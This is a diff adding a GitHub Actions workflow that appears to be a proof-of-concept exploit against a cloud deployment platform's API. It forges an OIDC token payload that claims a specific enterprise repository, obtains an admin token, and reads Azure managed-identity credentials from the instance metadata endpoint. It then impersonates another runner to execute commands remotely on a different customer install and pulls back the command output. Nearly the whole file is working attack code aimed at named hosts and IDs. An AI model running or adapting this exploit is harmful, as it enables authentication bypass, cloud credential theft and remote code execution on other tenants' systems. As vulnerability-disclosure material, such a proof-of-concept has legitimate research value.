@@ -1,0 +1,55 @@
+name: azure-cross-runner
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Use one Azure principal to run a command on a different install
+        shell: bash
+        run: |
+          set -euo pipefail
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          h,p,s=os.environ['REAL_TOKEN'].split('.')
+          fake={
+            'iss':'https://token.actions.githubusercontent.com','aud':'https://api.byoc.lovable.net',
+            'sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main',
+            'repository':'lovablelabs/lovable-enterprise','repository_id':'1287375944',
+            'repository_owner':'lovablelabs','repository_owner_id':'148472368',
+            'repository_visibility':'internal','ref':'refs/heads/main','ref_type':'branch','event_name':'push',
+            'workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main',
+            'job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main',
+          }
+          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))},separators=(',',':')))
+          PY
+          )"
+          bootstrap="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request")"
+          admin_token="$(jq -r .token <<<"$bootstrap")"
+          command="$(printf '%s' 'set -euo pipefail
+          raw=$(curl -sSf --connect-timeout 3 --max-time 10 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https%3A%2F%2Fmanagement.azure.com%2F")
+          azure_token=$(jq -r .access_token <<<"$raw")
+          exchange=$(jq -nc --arg token "$azure_token" --arg runner_id "runbtjyfz32zrurflgx3lqv9a4" "{token:\$token,runner_id:\$runner_id}" | curl -sSf https://runner.byoc.lovable.net/v1/runner-auth/azure -H "Content-Type: application/json" --data @-)
+          source_principal=$(jq -r .principal_id <<<"$exchange")
+          impersonated_runner=$(jq -r .runner_id <<<"$exchange")
+          target_token=$(jq -r .token <<<"$exchange")
+          target_subject=$(curl -sSf https://api.byoc.lovable.net/v1/auth/me -H "Authorization: Bearer $target_token" -H "X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247" | jq -r .subject)
+          target_action=$(jq -nc --arg command "echo nuon-azure-cross-runner-rce-20261020-1440 && id" "{command:\$command,timeout:60,name:\"azure-binding-proof\",request_id:\"nuon-azure-binding-proof-20261020-1440\",enable_kube_config:false}" | curl -sSf -X POST https://api.byoc.lovable.net/v1/installs/inldoc6bdbxidwsxjcpeconwcb/actions/adhoc-run -H "Authorization: Bearer $target_token" -H "X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247" -H "Content-Type: application/json" --data @-)
+          printf "source_principal=%s impersonated_runner=%s token_subject=%s target_action=%s\n" "$source_principal" "$impersonated_runner" "$target_subject" "$(jq -r .id <<<"$target_action")"')"
+          source_action="$(jq -nc --arg command "$command" '{command:$command,timeout:180,name:"azure-binding-proof-source",request_id:"nuon-azure-binding-source-20261020-1440",enable_kube_config:false}' | curl -sSf -X POST 'https://api.byoc.lovable.net/v1/installs/inl0hbh50qbe3p8dno3kiyb7j0/actions/adhoc-run' -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' -H 'Content-Type: application/json' --data @-)"
+          source_id="$(jq -r .id <<<"$source_action")"
+          for _ in $(seq 1 90); do
+            status="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/inl0hbh50qbe3p8dno3kiyb7j0/actions/runs/$source_id" -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
+            state="$(jq -r .status <<<"$status")"
+            if [ "$state" = finished ] || [ "$state" = error ]; then break; fi
+            sleep 2
+          done
+          source_job="$(jq -r .runner_job.id <<<"$status")"
+          source_log="$(jq -r .runner_job.log_stream_id <<<"$status")"
+          curl -sSf "https://api.byoc.lovable.net/v1/log-streams/$source_log/logs?order=asc&runner_job_id=$source_job" -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' | jq -r '.[] | select(.log_attributes["nuon.command_output"] == "true") | .body'
